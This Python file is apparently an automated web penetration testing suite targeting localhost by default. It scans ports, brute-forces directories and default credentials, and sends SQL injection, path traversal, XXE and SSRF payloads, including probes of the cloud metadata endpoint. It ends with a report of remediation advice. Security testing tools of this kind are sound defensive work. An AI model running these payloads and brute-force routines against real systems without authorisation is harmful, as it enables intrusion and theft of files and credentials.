"""
Advanced Penetration Testing Suite
Specialized penetration testing tools and techniques for web applications.
"""

import asyncio
import base64
import hashlib
import json
import logging
import random
import re
import string
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import subprocess

import aiohttp
import requests
from bs4 import BeautifulSoup
import dns.resolver
import nmap

logger = logging.getLogger(__name__)


# ============================================================================
# Penetration Testing Configuration
# ============================================================================

class PenetrationTestConfig:
    """Configuration for penetration testing."""

    def __init__(self):
        self.target_url = "http://localhost:8000"
        self.target_api = f"{self.target_url}/api/v1"
        self.target_host = urlparse(self.target_url).hostname
        self.target_port = urlparse(self.target_url).port or (443 if self.target_url.startswith('https') else 80)

        # Test credentials
        self.test_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "password"),
            ("demo", "demo")
        ]

        # Common usernames for enumeration
        self.common_usernames = [
            "admin", "administrator", "root", "test", "demo", "user", "guest",
            "support", "operator", "manager", "service", "account", "system"
        ]

        # Common passwords
        self.common_passwords = [
            "password", "123456", "admin", "root", "test", "guest", "demo",
            "password123", "admin123", "qwerty", "letmein", "welcome"
        ]

        # Web application testing parameters
        self.max_redirect_follow = 5
        self.request_timeout = 30
        self.max_concurrent_requests = 10

        # Network scanning parameters
        self.port_scan_range = "1-1000"
        self.scan_timeout = 10


# ============================================================================
# Network Reconnaissance
# ============================================================================

class NetworkRecon:
    """Network reconnaissance and scanning."""

    def __init__(self, config: PenetrationTestConfig):
        self.config = config
        self.findings = []

    async def run_network_scan(self) -> Dict[str, Any]:
        """Run comprehensive network reconnaissance."""
        results = {
            'dns_enumeration': await self.dns_enumeration(),
            'port_scanning': await self.port_scanning(),
            'service_detection': await self.service_detection(),
            'ssl_analysis': await self.ssl_analysis()
        }
        return results

    async def dns_enumeration(self) -> Dict[str, Any]:
        """Perform DNS enumeration."""
        results = {'subdomains': [], 'dns_records': {}, 'zone_transfer': False}

        if not self.config.target_host:
            return results

        try:
            # Common DNS records
            record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']

            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(self.config.target_host, record_type)
                    results['dns_records'][record_type] = [str(answer) for answer in answers]
                except Exception as e:
                    logger.debug(f"DNS record {record_type} query failed: {e}")

            # Subdomain enumeration
            common_subdomains = [
                'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging',
                'blog', 'shop', 'app', 'mobile', 'secure', 'vpn', 'portal'
            ]

            for subdomain in common_subdomains:
                try:
                    full_domain = f"{subdomain}.{self.config.target_host}"
                    answers = dns.resolver.resolve(full_domain, 'A')
                    if answers:
                        results['subdomains'].append({
                            'subdomain': full_domain,
                            'ip_addresses': [str(answer) for answer in answers]
                        })
                except Exception:
                    pass

            # Zone transfer attempt
            try:
                ns_records = dns.resolver.resolve(self.config.target_host, 'NS')
                for ns in ns_records:
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(str(ns), self.config.target_host))
                        if zone:
                            results['zone_transfer'] = True
                            self.findings.append({
                                'type': 'DNS Zone Transfer',
                                'severity': 'high',
                                'description': f'Zone transfer possible from {ns}'
                            })
                            break
                    except Exception:
                        pass
            except Exception:
                pass

        except Exception as e:
            logger.error(f"DNS enumeration failed: {e}")

        return results

    async def port_scanning(self) -> Dict[str, Any]:
        """Perform port scanning."""
        results = {'open_ports': [], 'filtered_ports': [], 'closed_ports': []}

        try:
            nm = nmap.PortScanner()
            scan_result = nm.scan(
                hosts=self.config.target_host,
                ports=self.config.port_scan_range,
                arguments='-sS -O --version-detection',
                timeout=self.config.scan_timeout
            )

            for host in scan_result['scan']:
                host_data = scan_result['scan'][host]

                if 'tcp' in host_data:
                    for port, port_data in host_data['tcp'].items():
                        port_info = {
                            'port': port,
                            'state': port_data['state'],
                            'service': port_data.get('name', 'unknown'),
                            'version': port_data.get('version', ''),
                            'product': port_data.get('product', '')
                        }

                        if port_data['state'] == 'open':
                            results['open_ports'].append(port_info)

                            # Check for potentially vulnerable services
                            if self._is_vulnerable_service(port_info):
                                self.findings.append({
                                    'type': 'Vulnerable Service',
                                    'severity': 'medium',
                                    'description': f'Potentially vulnerable service on port {port}: {port_info["service"]}',
                                    'details': port_info
                                })

                        elif port_data['state'] == 'filtered':
                            results['filtered_ports'].append(port_info)
                        else:
                            results['closed_ports'].append(port_info)

        except Exception as e:
            logger.error(f"Port scanning failed: {e}")
            # Fallback to basic connectivity test
            results = await self._basic_port_scan()

        return results

    async def _basic_port_scan(self) -> Dict[str, Any]:
        """Basic port scanning using socket connections."""
        results = {'open_ports': [], 'filtered_ports': [], 'closed_ports': []}

        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306]

        for port in common_ports:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.config.target_host, port),
                    timeout=5
                )
                writer.close()
                await writer.wait_closed()

                results['open_ports'].append({
                    'port': port,
                    'state': 'open',
                    'service': self._get_service_name(port)
                })

            except asyncio.TimeoutError:
                results['filtered_ports'].append({
                    'port': port,
                    'state': 'filtered'
                })
            except Exception:
                results['closed_ports'].append({
                    'port': port,
                    'state': 'closed'
                })

        return results

    def _is_vulnerable_service(self, port_info: Dict[str, Any]) -> bool:
        """Check if service is potentially vulnerable."""
        vulnerable_patterns = [
            ('ftp', ['vsftpd 2.3.4', 'proftpd 1.3.3']),
            ('ssh', ['openssh 4.', 'openssh 5.']),
            ('telnet', ['.*']),  # Telnet is inherently insecure
            ('smtp', ['postfix 2.8', 'sendmail 8.14']),
            ('http', ['apache 2.2', 'nginx 1.4', 'iis 6.0'])
        ]

        service = port_info.get('service', '').lower()
        version = port_info.get('version', '').lower()
        product = port_info.get('product', '').lower()

        for svc, vuln_versions in vulnerable_patterns:
            if svc in service:
                for vuln_pattern in vuln_versions:
                    if re.search(vuln_pattern, f"{product} {version}"):
                        return True

        return False

    def _get_service_name(self, port: int) -> str:
        """Get common service name for port."""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
            53: 'dns', 80: 'http', 110: 'pop3', 143: 'imap',
            443: 'https', 993: 'imaps', 995: 'pop3s',
            3389: 'rdp', 5432: 'postgresql', 3306: 'mysql'
        }
        return services.get(port, 'unknown')

    async def service_detection(self) -> Dict[str, Any]:
        """Detect services running on open ports."""
        results = {'detected_services': []}

        # This would be expanded with actual service fingerprinting
        common_services = [
            {'port': 80, 'service': 'http', 'check_method': self._check_http_service},
            {'port': 443, 'service': 'https', 'check_method': self._check_https_service},
            {'port': 22, 'service': 'ssh', 'check_method': self._check_ssh_service}
        ]

        for service_config in common_services:
            try:
                service_info = await service_config['check_method']()
                if service_info:
                    results['detected_services'].append(service_info)
            except Exception as e:
                logger.debug(f"Service detection failed for {service_config['service']}: {e}")

        return results

    async def _check_http_service(self) -> Optional[Dict[str, Any]]:
        """Check HTTP service details."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"http://{self.config.target_host}:{self.config.target_port}",
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    return {
                        'service': 'http',
                        'port': self.config.target_port,
                        'server': response.headers.get('Server', 'unknown'),
                        'status': response.status,
                        'headers': dict(response.headers)
                    }
        except Exception:
            return None

    async def _check_https_service(self) -> Optional[Dict[str, Any]]:
        """Check HTTPS service details."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://{self.config.target_host}",
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False  # For testing
                ) as response:
                    return {
                        'service': 'https',
                        'port': 443,
                        'server': response.headers.get('Server', 'unknown'),
                        'status': response.status,
                        'ssl_enabled': True
                    }
        except Exception:
            return None

    async def _check_ssh_service(self) -> Optional[Dict[str, Any]]:
        """Check SSH service details."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target_host, 22),
                timeout=10
            )

            banner = await asyncio.wait_for(reader.readline(), timeout=5)
            writer.close()
            await writer.wait_closed()

            return {
                'service': 'ssh',
                'port': 22,
                'banner': banner.decode().strip(),
                'version': banner.decode().strip()
            }
        except Exception:
            return None

    async def ssl_analysis(self) -> Dict[str, Any]:
        """Analyze SSL/TLS configuration."""
        results = {'ssl_enabled': False, 'vulnerabilities': []}

        if not self.config.target_url.startswith('https'):
            return results

        try:
            # Use sslyze or similar tool for comprehensive SSL analysis
            # For now, basic SSL checks
            import ssl

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with ssl.create_connection((self.config.target_host, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.config.target_host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()

                    results['ssl_enabled'] = True
                    results['certificate'] = cert
                    results['cipher_suite'] = cipher

                    # Check for weak ciphers
                    if cipher and cipher[1] in ['RC4', 'DES', '3DES']:
                        results['vulnerabilities'].append({
                            'type': 'Weak Cipher',
                            'severity': 'medium',
                            'description': f'Weak cipher suite in use: {cipher[1]}'
                        })

                    # Check certificate expiration
                    if cert:
                        not_after = cert.get('notAfter')
                        if not_after:
                            import datetime
                            expiry_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                            if expiry_date < datetime.datetime.utcnow():
                                results['vulnerabilities'].append({
                                    'type': 'Expired Certificate',
                                    'severity': 'high',
                                    'description': 'SSL certificate has expired'
                                })

        except Exception as e:
            logger.debug(f"SSL analysis failed: {e}")

        return results


# ============================================================================
# Web Application Testing
# ============================================================================

class WebAppTesting:
    """Web application penetration testing."""

    def __init__(self, config: PenetrationTestConfig):
        self.config = config
        self.session = None
        self.discovered_urls = set()
        self.forms = []
        self.cookies = {}
        self.findings = []

    async def run_webapp_tests(self) -> Dict[str, Any]:
        """Run comprehensive web application tests."""
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.request_timeout)
        ) as session:
            self.session = session

            results = {
                'reconnaissance': await self.web_reconnaissance(),
                'directory_bruteforce': await self.directory_bruteforce(),
                'form_analysis': await self.form_analysis(),
                'authentication_testing': await self.authentication_testing(),
                'session_testing': await self.session_testing(),
                'file_inclusion_testing': await self.file_inclusion_testing(),
                'xxe_testing': await self.xxe_testing(),
                'ssrf_testing': await self.ssrf_testing()
            }

            return results

    async def web_reconnaissance(self) -> Dict[str, Any]:
        """Perform web application reconnaissance."""
        results = {'technology_stack': {}, 'interesting_files': [], 'error_pages': []}

        try:
            # Technology detection
            async with self.session.get(self.config.target_url) as response:
                headers = response.headers
                content = await response.text()

                # Detect web server
                server = headers.get('Server', '')
                if server:
                    results['technology_stack']['server'] = server

                # Detect framework/CMS
                framework_indicators = [
                    ('Django', ['csrfmiddlewaretoken', 'django']),
                    ('Flask', ['flask', 'werkzeug']),
                    ('FastAPI', ['fastapi', 'uvicorn']),
                    ('WordPress', ['wp-content', 'wp-includes']),
                    ('React', ['react', '_next']),
                    ('Angular', ['ng-', 'angular'])
                ]

                for framework, indicators in framework_indicators:
                    if any(indicator in content.lower() or indicator in str(headers).lower()
                           for indicator in indicators):
                        results['technology_stack']['framework'] = framework
                        break

                # Check for interesting headers
                interesting_headers = [
                    'X-Powered-By', 'X-AspNet-Version', 'X-Frame-Options',
                    'Content-Security-Policy', 'Strict-Transport-Security'
                ]

                for header in interesting_headers:
                    if header in headers:
                        results['technology_stack'][header] = headers[header]

            # Look for interesting files
            interesting_files = [
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
                'crossdomain.xml', 'clientaccesspolicy.xml', 'readme.txt',
                'changelog.txt', 'version.txt', 'config.json'
            ]

            for file in interesting_files:
                try:
                    async with self.session.get(f"{self.config.target_url}/{file}") as response:
                        if response.status == 200:
                            content = await response.text()
                            results['interesting_files'].append({
                                'file': file,
                                'status': response.status,
                                'size': len(content),
                                'content_preview': content[:200]
                            })
                except Exception:
                    pass

            # Test for different error pages
            error_urls = ['nonexistent-page-12345', 'admin/config', '../etc/passwd']
            for error_url in error_urls:
                try:
                    async with self.session.get(f"{self.config.target_url}/{error_url}") as response:
                        if response.status >= 400:
                            content = await response.text()
                            results['error_pages'].append({
                                'url': error_url,
                                'status': response.status,
                                'content_preview': content[:200]
                            })

                            # Check for information disclosure in error pages
                            if any(keyword in content.lower() for keyword in
                                   ['stack trace', 'sql', 'database', 'exception', 'debug']):
                                self.findings.append({
                                    'type': 'Information Disclosure',
                                    'severity': 'medium',
                                    'description': f'Error page reveals sensitive information: {error_url}',
                                    'details': {'status': response.status, 'preview': content[:200]}
                                })
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Web reconnaissance failed: {e}")

        return results

    async def directory_bruteforce(self) -> Dict[str, Any]:
        """Perform directory and file bruteforcing."""
        results = {'discovered_paths': [], 'interesting_responses': []}

        # Common directories and files
        wordlist = [
            'admin', 'administrator', 'login', 'auth', 'api', 'v1', 'v2',
            'test', 'dev', 'staging', 'backup', 'config', 'settings',
            'upload', 'uploads', 'files', 'documents', 'images', 'assets',
            'static', 'css', 'js', 'scripts', 'includes', 'lib', 'vendor',
            'tmp', 'temp', 'cache', 'logs', 'log', 'debug', 'trace'
        ]

        # File extensions to check
        extensions = ['', '.php', '.asp', '.aspx', '.jsp', '.js', '.json', '.xml', '.txt', '.bak']

        semaphore = asyncio.Semaphore(self.config.max_concurrent_requests)

        async def check_path(path):
            async with semaphore:
                try:
                    async with self.session.get(
                        f"{self.config.target_url}/{path}",
                        allow_redirects=False
                    ) as response:
                        if response.status in [200, 301, 302, 403]:
                            results['discovered_paths'].append({
                                'path': path,
                                'status': response.status,
                                'size': response.headers.get('Content-Length', '0'),
                                'content_type': response.headers.get('Content-Type', '')
                            })

                            # Check for admin interfaces
                            if any(keyword in path.lower() for keyword in ['admin', 'management', 'config']):
                                if response.status == 200:
                                    self.findings.append({
                                        'type': 'Admin Interface',
                                        'severity': 'medium',
                                        'description': f'Admin interface accessible: /{path}',
                                        'details': {'status': response.status}
                                    })
                except Exception:
                    pass

        # Create tasks for all paths
        tasks = []
        for word in wordlist:
            for ext in extensions:
                path = f"{word}{ext}"
                tasks.append(check_path(path))

        await asyncio.gather(*tasks, return_exceptions=True)

        return results

    async def form_analysis(self) -> Dict[str, Any]:
        """Analyze forms for potential vulnerabilities."""
        results = {'forms_found': [], 'potential_issues': []}

        try:
            async with self.session.get(self.config.target_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')

                forms = soup.find_all('form')

                for i, form in enumerate(forms):
                    form_data = {
                        'id': i,
                        'action': form.get('action', ''),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }

                    # Analyze form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        input_data = {
                            'type': input_elem.get('type', 'text'),
                            'name': input_elem.get('name', ''),
                            'value': input_elem.get('value', ''),
                            'required': input_elem.has_attr('required')
                        }
                        form_data['inputs'].append(input_data)

                        # Check for password fields without proper attributes
                        if input_data['type'] == 'password':
                            if 'autocomplete' not in input_elem.attrs:
                                results['potential_issues'].append({
                                    'type': 'Password Autocomplete',
                                    'severity': 'low',
                                    'description': 'Password field allows autocomplete',
                                    'form_id': i
                                })

                    # Check for CSRF protection
                    csrf_tokens = form.find_all('input', {'name': re.compile(r'csrf|token|_token')})
                    if not csrf_tokens and form_data['method'] == 'post':
                        results['potential_issues'].append({
                            'type': 'Missing CSRF Protection',
                            'severity': 'high',
                            'description': f'POST form without CSRF token: {form_data["action"]}',
                            'form_id': i
                        })

                    results['forms_found'].append(form_data)
                    self.forms.append(form_data)

        except Exception as e:
            logger.error(f"Form analysis failed: {e}")

        return results

    async def authentication_testing(self) -> Dict[str, Any]:
        """Test authentication mechanisms."""
        results = {'brute_force_results': [], 'bypass_attempts': []}

        # Find login forms
        login_forms = [form for form in self.forms if any(
            input_field.get('type') == 'password' for input_field in form.get('inputs', [])
        )]

        for form in login_forms:
            # Test common credentials
            for username, password in self.config.test_credentials[:5]:  # Limit for testing
                try:
                    form_data = {}
                    for input_field in form.get('inputs', []):
                        if input_field.get('type') == 'password':
                            form_data[input_field.get('name', 'password')] = password
                        elif 'user' in input_field.get('name', '').lower() or 'email' in input_field.get('name', '').lower():
                            form_data[input_field.get('name', 'username')] = username

                    action_url = urljoin(self.config.target_url, form.get('action', '/login'))

                    async with self.session.post(action_url, data=form_data) as response:
                        result = {
                            'username': username,
                            'password': password,
                            'status': response.status,
                            'success': response.status == 200 and 'error' not in await response.text()
                        }
                        results['brute_force_results'].append(result)

                        if result['success']:
                            self.findings.append({
                                'type': 'Weak Credentials',
                                'severity': 'critical',
                                'description': f'Default credentials work: {username}:{password}',
                                'details': result
                            })

                except Exception as e:
                    logger.debug(f"Authentication test failed: {e}")

        # Test for SQL injection in login
        sql_payloads = ["admin' OR '1'='1' --", "' OR 1=1 --"]
        for payload in sql_payloads:
            try:
                form_data = {'username': payload, 'password': 'test'}

                async with self.session.post(f"{self.config.target_api}/auth/login", json=form_data) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'token' in content or 'success' in content:
                            self.findings.append({
                                'type': 'SQL Injection Authentication Bypass',
                                'severity': 'critical',
                                'description': f'SQL injection bypass successful: {payload}',
                                'details': {'status': response.status}
                            })
            except Exception as e:
                logger.debug(f"SQL injection test failed: {e}")

        return results

    async def session_testing(self) -> Dict[str, Any]:
        """Test session management vulnerabilities."""
        results = {'session_issues': []}

        try:
            # Test for session fixation
            async with self.session.get(self.config.target_url) as response:
                initial_cookies = response.cookies

            # Test login
            login_data = {'username': 'test', 'password': 'test'}
            async with self.session.post(f"{self.config.target_api}/auth/login", json=login_data) as response:
                post_login_cookies = response.cookies

                # Check if session ID changed
                session_changed = False
                for cookie_name in initial_cookies:
                    if cookie_name in post_login_cookies:
                        if initial_cookies[cookie_name] != post_login_cookies[cookie_name]:
                            session_changed = True
                            break

                if not session_changed:
                    results['session_issues'].append({
                        'type': 'Session Fixation',
                        'severity': 'medium',
                        'description': 'Session ID does not change after login'
                    })

            # Test for insecure cookie attributes
            for cookie in post_login_cookies.values():
                cookie_issues = []

                if not cookie.get('secure'):
                    cookie_issues.append('Missing Secure flag')

                if not cookie.get('httponly'):
                    cookie_issues.append('Missing HttpOnly flag')

                if not cookie.get('samesite'):
                    cookie_issues.append('Missing SameSite attribute')

                if cookie_issues:
                    results['session_issues'].append({
                        'type': 'Insecure Cookie',
                        'severity': 'medium',
                        'description': f'Cookie security issues: {", ".join(cookie_issues)}',
                        'cookie_name': cookie.key
                    })

        except Exception as e:
            logger.debug(f"Session testing failed: {e}")

        return results

    async def file_inclusion_testing(self) -> Dict[str, Any]:
        """Test for Local File Inclusion (LFI) and Remote File Inclusion (RFI)."""
        results = {'lfi_tests': [], 'rfi_tests': []}

        # LFI payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]

        # Test parameters that might be vulnerable
        test_params = ['file', 'page', 'document', 'include', 'path', 'template']

        for param in test_params:
            for payload in lfi_payloads:
                try:
                    url = f"{self.config.target_url}/?{param}={payload}"
                    async with self.session.get(url) as response:
                        content = await response.text()

                        # Check for successful LFI
                        if any(indicator in content for indicator in ['root:', 'daemon:', '[boot loader]']):
                            results['lfi_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'vulnerable': True,
                                'response_preview': content[:200]
                            })

                            self.findings.append({
                                'type': 'Local File Inclusion',
                                'severity': 'high',
                                'description': f'LFI vulnerability in parameter: {param}',
                                'payload': payload
                            })
                        else:
                            results['lfi_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'vulnerable': False
                            })

                except Exception as e:
                    logger.debug(f"LFI test failed: {e}")

        # RFI testing (limited for safety)
        rfi_payloads = ['http://httpbin.org/robots.txt']  # Safe external file

        for param in test_params:
            for payload in rfi_payloads:
                try:
                    url = f"{self.config.target_url}/?{param}={payload}"
                    async with self.session.get(url) as response:
                        content = await response.text()

                        # Check for successful RFI (robots.txt content)
                        if 'user-agent' in content.lower():
                            results['rfi_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'vulnerable': True
                            })

                            self.findings.append({
                                'type': 'Remote File Inclusion',
                                'severity': 'critical',
                                'description': f'RFI vulnerability in parameter: {param}',
                                'payload': payload
                            })
                        else:
                            results['rfi_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'vulnerable': False
                            })

                except Exception as e:
                    logger.debug(f"RFI test failed: {e}")

        return results

    async def xxe_testing(self) -> Dict[str, Any]:
        """Test for XML External Entity (XXE) vulnerabilities."""
        results = {'xxe_tests': []}

        # XXE payloads
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://httpbin.org/robots.txt">]>
<test>&xxe;</test>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<test>test</test>'''
        ]

        # Test endpoints that might accept XML
        xml_endpoints = [
            '/api/v1/upload',
            '/api/v1/import',
            '/api/v1/config',
            '/upload',
            '/import'
        ]

        for endpoint in xml_endpoints:
            for i, payload in enumerate(xxe_payloads):
                try:
                    headers = {'Content-Type': 'application/xml'}
                    url = f"{self.config.target_url}{endpoint}"

                    async with self.session.post(url, data=payload, headers=headers) as response:
                        content = await response.text()

                        # Check for XXE success indicators
                        if any(indicator in content for indicator in ['root:', 'daemon:', 'user-agent']):
                            results['xxe_tests'].append({
                                'endpoint': endpoint,
                                'payload_id': i,
                                'vulnerable': True,
                                'response_preview': content[:200]
                            })

                            self.findings.append({
                                'type': 'XML External Entity (XXE)',
                                'severity': 'high',
                                'description': f'XXE vulnerability in endpoint: {endpoint}',
                                'payload_id': i
                            })
                        else:
                            results['xxe_tests'].append({
                                'endpoint': endpoint,
                                'payload_id': i,
                                'vulnerable': False
                            })

                except Exception as e:
                    logger.debug(f"XXE test failed: {e}")

        return results

    async def ssrf_testing(self) -> Dict[str, Any]:
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities."""
        results = {'ssrf_tests': []}

        # SSRF payloads (using safe external services)
        ssrf_payloads = [
            'http://httpbin.org/ip',
            'https://httpbin.org/user-agent',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://localhost:80',
            'http://127.0.0.1:22'
        ]

        # Parameters that might be vulnerable to SSRF
        ssrf_params = ['url', 'callback', 'webhook', 'fetch', 'proxy', 'redirect']

        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    # Test as GET parameter
                    url = f"{self.config.target_url}/?{param}={payload}"
                    async with self.session.get(url) as response:
                        content = await response.text()

                        # Check for SSRF success indicators
                        if any(indicator in content.lower() for indicator in
                               ['origin', 'user-agent', 'aws', 'instance-id', 'ssh']):
                            results['ssrf_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'vulnerable': True,
                                'response_preview': content[:200]
                            })

                            self.findings.append({
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'high',
                                'description': f'SSRF vulnerability in parameter: {param}',
                                'payload': payload
                            })
                        else:
                            results['ssrf_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'vulnerable': False
                            })

                    # Test as POST data
                    post_data = {param: payload}
                    async with self.session.post(self.config.target_url, data=post_data) as response:
                        content = await response.text()

                        if any(indicator in content.lower() for indicator in
                               ['origin', 'user-agent', 'aws', 'instance-id']):
                            results['ssrf_tests'].append({
                                'parameter': param,
                                'payload': payload,
                                'method': 'POST',
                                'vulnerable': True,
                                'response_preview': content[:200]
                            })

                            self.findings.append({
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'high',
                                'description': f'SSRF vulnerability in POST parameter: {param}',
                                'payload': payload
                            })

                except Exception as e:
                    logger.debug(f"SSRF test failed: {e}")

        return results


# ============================================================================
# Penetration Test Runner
# ============================================================================

class PenetrationTestRunner:
    """Main penetration test runner."""

    def __init__(self, config: PenetrationTestConfig):
        self.config = config
        self.all_findings = []

    async def run_full_pentest(self) -> Dict[str, Any]:
        """Run complete penetration test suite."""
        logger.info(f"Starting penetration test against {self.config.target_url}")

        start_time = datetime.utcnow()

        # Initialize test components
        network_recon = NetworkRecon(self.config)
        webapp_testing = WebAppTesting(self.config)

        results = {
            'target_info': {
                'url': self.config.target_url,
                'host': self.config.target_host,
                'port': self.config.target_port
            },
            'network_reconnaissance': {},
            'web_application_testing': {},
            'findings_summary': {}
        }

        try:
            # Network reconnaissance
            logger.info("Running network reconnaissance...")
            results['network_reconnaissance'] = await network_recon.run_network_scan()
            self.all_findings.extend(network_recon.findings)

            # Web application testing
            logger.info("Running web application tests...")
            results['web_application_testing'] = await webapp_testing.run_webapp_tests()
            self.all_findings.extend(webapp_testing.findings)

        except Exception as e:
            logger.error(f"Penetration test failed: {e}")

        end_time = datetime.utcnow()

        # Generate summary
        results['findings_summary'] = self._generate_findings_summary(start_time, end_time)

        logger.info("Penetration test completed")
        return results

    def _generate_findings_summary(self, start_time: datetime, end_time: datetime) -> Dict[str, Any]:
        """Generate findings summary and report."""
        duration = (end_time - start_time).total_seconds()

        # Categorize findings by severity
        severity_counts = {
            'critical': len([f for f in self.all_findings if f.get('severity') == 'critical']),
            'high': len([f for f in self.all_findings if f.get('severity') == 'high']),
            'medium': len([f for f in self.all_findings if f.get('severity') == 'medium']),
            'low': len([f for f in self.all_findings if f.get('severity') == 'low'])
        }

        # Calculate risk score
        risk_score = (
            severity_counts['critical'] * 10 +
            severity_counts['high'] * 7 +
            severity_counts['medium'] * 4 +
            severity_counts['low'] * 1
        )

        return {
            'test_duration_seconds': duration,
            'total_findings': len(self.all_findings),
            'severity_breakdown': severity_counts,
            'risk_score': risk_score,
            'all_findings': self.all_findings,
            'recommendations': self._generate_recommendations()
        }

    def _generate_recommendations(self) -> List[Dict[str, Any]]:
        """Generate remediation recommendations."""
        recommendations = []

        # Group findings by type
        finding_types = {}
        for finding in self.all_findings:
            finding_type = finding.get('type', 'Unknown')
            if finding_type not in finding_types:
                finding_types[finding_type] = []
            finding_types[finding_type].append(finding)

        # Generate recommendations for each type
        for finding_type, findings in finding_types.items():
            severity = max([f.get('severity', 'low') for f in findings],
                          key=lambda x: ['low', 'medium', 'high', 'critical'].index(x))

            recommendation = self._get_recommendation(finding_type)

            recommendations.append({
                'finding_type': finding_type,
                'count': len(findings),
                'highest_severity': severity,
                'recommendation': recommendation,
                'priority': self._get_priority(severity)
            })

        # Sort by severity
        priority_order = ['critical', 'high', 'medium', 'low']
        recommendations.sort(key=lambda x: priority_order.index(x['highest_severity']))

        return recommendations

    def _get_recommendation(self, finding_type: str) -> str:
        """Get specific recommendation for finding type."""
        recommendations = {
            'Vulnerable Service': 'Update vulnerable services to latest versions and disable unnecessary services.',
            'Admin Interface': 'Restrict access to admin interfaces using IP whitelisting or VPN.',
            'Information Disclosure': 'Configure proper error handling and remove version information from responses.',
            'Weak Credentials': 'Implement strong password policies and change all default credentials.',
            'SQL Injection Authentication Bypass': 'Use parameterized queries and proper input validation.',
            'Session Fixation': 'Regenerate session IDs after successful authentication.',
            'Insecure Cookie': 'Set proper cookie attributes: Secure, HttpOnly, and SameSite.',
            'Local File Inclusion': 'Implement proper input validation and use allow-lists for file access.',
            'Remote File Inclusion': 'Disable allow_url_include and validate all user inputs.',
            'XML External Entity (XXE)': 'Disable external entity processing in XML parsers.',
            'Server-Side Request Forgery (SSRF)': 'Implement proper URL validation and use allow-lists for external requests.'
        }

        return recommendations.get(finding_type, 'Review and remediate this security issue according to best practices.')

    def _get_priority(self, severity: str) -> str:
        """Get priority based on severity."""
        priority_map = {
            'critical': 'Immediate',
            'high': 'High',
            'medium': 'Medium',
            'low': 'Low'
        }
        return priority_map.get(severity, 'Medium')


# ============================================================================
# Main Execution
# ============================================================================

async def run_penetration_test():
    """Run comprehensive penetration test."""
    config = PenetrationTestConfig()
    runner = PenetrationTestRunner(config)

    report = await runner.run_full_pentest()

    # Save report
    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    report_file = f"penetration_test_report_{timestamp}.json"

    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2, default=str)

    # Print summary
    findings = report['findings_summary']
    print("\n" + "="*80)
    print("PENETRATION TEST REPORT SUMMARY")
    print("="*80)
    print(f"Target: {config.target_url}")
    print(f"Total Findings: {findings['total_findings']}")
    print(f"Risk Score: {findings['risk_score']}")
    print(f"Critical: {findings['severity_breakdown']['critical']}")
    print(f"High: {findings['severity_breakdown']['high']}")
    print(f"Medium: {findings['severity_breakdown']['medium']}")
    print(f"Low: {findings['severity_breakdown']['low']}")
    print(f"Test Duration: {findings['test_duration_seconds']:.1f} seconds")
    print("="*80)
    print(f"Detailed report saved to: {report_file}")

    return report


if __name__ == "__main__":
    asyncio.run(run_penetration_test())